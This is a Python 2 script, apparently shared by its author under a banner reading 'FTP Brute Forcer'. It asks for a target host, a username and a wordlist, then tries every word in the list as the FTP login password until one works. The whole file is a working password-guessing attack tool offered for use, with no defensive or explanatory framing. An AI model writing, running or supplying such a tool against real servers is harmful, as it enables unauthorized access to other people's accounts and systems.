from ftplib import FTP
import datetime
import sys
import platform

print "\n\n"
print "********************************************************"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++\033[1;36mFTP Brute Forcer\033[0m++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|+++++++++++++++++Author : \033[1;32mAhmed Safa\033[0m++++++++++++++++++|"
print "|+++++++++++++++facebook/\033[32mahmedsafa404\033[0m++++++++++++++++++|"

#Info
os = platform.system()
sys = platform.release()
print "|+++++++++++++++++Operating System :" +os +"++++++++++++++|"

print"|++++++++++++Released :"+sys+"++++++++++++++++|"
time = datetime.datetime.now()
print "|+++++++\033[34mDate & Time\033[0m :"+str(time)+"++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "********************************************************"

print "\n"


host = raw_input("Enter Host : ")

user = raw_input("Enter username : ")

password = raw_input("Enter Wordlist : ")

password = open(password,'r')

print "\n"

for Wordlist in password :
	try :
		ftp = FTP(host)
		ftp.login(user,Wordlist)

		print "\033[1;32m [+]Password Found :%s \033[0m"%Wordlist

		break;

	except:
		print "\033[33m [!]Password not Found : %s \033[0m"%Wordlist
